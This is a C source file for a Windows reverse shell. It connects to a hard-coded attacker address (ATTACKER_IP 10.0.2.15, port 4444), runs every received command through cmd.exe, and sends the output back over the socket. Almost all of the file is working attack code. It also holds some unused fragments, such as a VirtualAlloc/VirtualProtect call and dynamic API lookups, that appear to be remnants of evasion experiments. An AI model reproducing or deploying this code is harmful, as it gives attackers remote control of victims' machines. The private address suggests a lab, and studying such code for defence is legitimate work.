#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "kernel32.lib")

#define ATTACKER_IP "10.0.2.15"
#define ATTACKER_PORT 4444
#define BUFFER_SIZE 4096

HANDLE create_process_with_pipe(char *command, HANDLE *hReadPipe) {
    HANDLE hWritePipe;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    if (!CreatePipe(hReadPipe, &hWritePipe, &sa, 0)) {
        return NULL;
    }
    
    SetHandleInformation(*hReadPipe, HANDLE_FLAG_INHERIT, 0);
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;
    
    ZeroMemory(&pi, sizeof(pi));
    
    if (!CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe);
        CloseHandle(*hReadPipe);
        return NULL;
    }
    
    CloseHandle(hWritePipe);
    CloseHandle(pi.hThread);
    return pi.hProcess;
}

#include <stdio.h>

int main() {

    printf("Calling function\n");

    void *pointer_my_man = VirtualAlloc(NULL, 3, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD oldProtect;
    VirtualProtect(pointer_my_man, 3, PAGE_EXECUTE_READ, &oldProtect);
    HMODULE library = LoadLibraryA("ws2_32");
    if(library == NULL){
        printf("Not able to find the sockets library\n");
	exit(-1);
    }
    FARPROC funcion_address = GetProcAddress(library, "WSAStartup");
    FARPROC socket_address = GetProcAddress(library, "socket");
    FARPROC connection_address = GetProcAddress(library, "connect");
    if(funcion_address == NULL || socket_address == NULL || connection_address == NULL){
	printf("Goodbye\n");
        exit(-1);
    }
    printf("Hello there\n");

    WSADATA wsa_data;
    SOCKET sock;
    struct sockaddr_in sa;
    char buffer[BUFFER_SIZE];
    char command[BUFFER_SIZE];
    HANDLE hProcess, hReadPipe;
    DWORD bytes_read;
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        ExitProcess(1);
    }
    
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        ExitProcess(1);
    }
    
    // Setup connection
    sa.sin_family = AF_INET;
    sa.sin_port = htons(ATTACKER_PORT);
    sa.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    
    // Connect to attacker
    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        ExitProcess(1);
    }
    
    // Command loop
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        memset(command, 0, BUFFER_SIZE);
        
        // Receive command
        int recv_result = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (recv_result <= 0) {
            break;
        }
        
        // Remove newline
        buffer[strcspn(buffer, "\r\n")] = 0;
        
        // Skip empty commands
        if (strlen(buffer) == 0) {
            continue;
        }
        
        // Create command with cmd.exe
        sprintf_s(command, sizeof(command), "cmd.exe /c %s", buffer);
        
        // Execute command
        hProcess = create_process_with_pipe(command, &hReadPipe);
        
        if (hProcess != NULL) {
            // Read and send output
            while (ReadFile(hReadPipe, buffer, BUFFER_SIZE - 1, &bytes_read, NULL) && bytes_read > 0) {
                buffer[bytes_read] = 0;
                send(sock, buffer, bytes_read, 0);
            }
            
            CloseHandle(hReadPipe);
            WaitForSingleObject(hProcess, INFINITE);
            CloseHandle(hProcess);
        }
        
        // Send newline delimiter
        send(sock, "\n", 1, 0);
    }
    
    closesocket(sock);
    WSACleanup();
    return 0;
}
